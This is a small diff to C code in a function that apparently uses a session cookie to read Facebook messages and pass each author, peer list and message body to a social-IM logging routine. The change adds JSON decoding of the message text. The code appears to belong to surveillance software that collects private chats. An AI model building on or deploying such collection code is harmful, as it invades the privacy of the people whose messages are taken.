@@ -329,6 +329,7 @@ DWORD HandleFBMessages(char *cookie)
 				_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
 				tstamp.tm_year += 1900;
 				tstamp.tm_mon++;
+				JsonDecode(msg_body);
 				LogSocialIMMessageA("Facebook", "", peers, author, msg_body, &tstamp);
 				SAFE_FREE(msg_body);
 			} else
